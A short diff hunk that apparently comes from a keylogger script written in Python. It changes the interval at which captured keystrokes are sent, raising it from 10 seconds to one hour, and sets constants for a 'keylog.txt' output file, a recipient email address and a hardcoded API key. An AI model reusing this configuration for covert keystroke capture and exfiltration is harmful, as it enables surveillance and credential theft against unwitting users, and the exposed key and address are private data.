@@ -7,7 +7,7 @@ import os
 import threading
 from utils.utils import *
 
-TIME_DELAY_TO_SENT = 10
+TIME_DELAY_TO_SENT = 60*60
 API_KEY = "pk_prod_FQTZ70SHDJMVA8GNGAW1PQV4MT9R"
 OUTPUT_FILE_NAME = "keylog.txt"
 TO_EMAIL = "hyquaq15@gmail.com"
